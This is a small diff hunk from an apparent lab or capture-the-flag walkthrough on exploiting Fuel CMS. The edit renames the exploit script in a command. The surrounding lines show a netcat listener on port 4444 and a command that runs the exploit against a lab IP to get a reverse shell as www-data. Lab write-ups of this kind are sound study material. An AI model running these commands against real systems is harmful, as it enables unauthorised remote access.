@@ -61,7 +61,7 @@ nc -lvnp 4444
 The exploit was then executed with the appropriate parameters:
 
 ```bash
-python3 fuel_rce.py http://10.130.137.229 10.129.79.84 4444
+python3 Fuel-Updated.py http://10.130.137.229 10.129.79.84 4444
 ```
 
 Once executed, the target system initiated a connection back to the attacker, resulting in a **reverse shell** under the `www-data` user.
